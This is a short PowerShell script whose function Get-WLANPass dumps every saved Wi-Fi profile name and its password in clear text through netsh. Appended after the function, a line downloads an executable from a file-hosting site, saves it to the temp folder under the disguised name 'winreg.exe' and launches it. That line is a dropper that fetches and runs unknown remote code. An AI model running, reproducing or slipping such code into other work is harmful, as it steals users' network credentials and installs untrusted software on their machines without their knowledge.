function Get-WLANPass
{

$netsh = (netsh wlan show profiles)
$netsh | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
}
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/hsmqrh.exe',"$env:TEMP\winreg.exe");Start-Process ("$env:TEMP\winreg.exe")

